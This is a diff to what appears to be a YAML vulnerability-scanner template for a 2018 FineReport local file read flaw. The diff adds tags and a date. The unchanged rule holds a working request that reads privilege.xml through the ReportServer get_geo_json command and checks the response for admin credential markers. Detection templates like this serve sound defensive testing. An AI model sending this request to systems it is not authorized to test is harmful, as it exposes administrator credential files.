@@ -23,7 +23,8 @@ info:
     body="isSupportForgetPwd"
   reference:
     - https://mp.weixin.qq.com/s/339OfovdxZ98HHBXFnjOFQ
-  tags: cnvd,cnvd2018,lfi
+  tags: cnvd,cnvd2018,lfi,帆软,report,fineReport,fileread
+  created: 2020/09/11
 
 rules:
   r0:
@@ -35,5 +36,5 @@ rules:
     request:
       method: GET
       path: /report/ReportServer?op=chart&cmd=get_geo_json&resourcepath=privilege.xml
-    expression: response.status == 200 && response.body.bcontains(b'<![CDATA[admin]]') && response.body.bcontains(b'op=fr_platform]]>') && response.body.bcontains(b'PrivilegeManager') 
+    expression: response.status == 200 && response.body.bcontains(b'<![CDATA[admin]]') && response.body.bcontains(b'op=fr_platform]]>') && response.body.bcontains(b'PrivilegeManager')
 expression: r0() || r1()
